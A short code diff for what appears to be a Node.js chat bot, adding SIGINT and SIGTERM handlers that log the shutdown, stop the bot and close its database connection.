-process.once('SIGTERM', () => { bot.stop('SIGTERM'); db.close(); });
+process.once('SIGINT', () => {
+    addLog('SYSTEM', 'Bot stopped (SIGINT)');
+    bot.stop('SIGINT');
+    db.close();
+});
+process.once('SIGTERM', () => {
+    addLog('SYSTEM', 'Bot stopped (SIGTERM)');
+    bot.stop('SIGTERM');
+    db.close();
+});
 
 module.exports = bot;
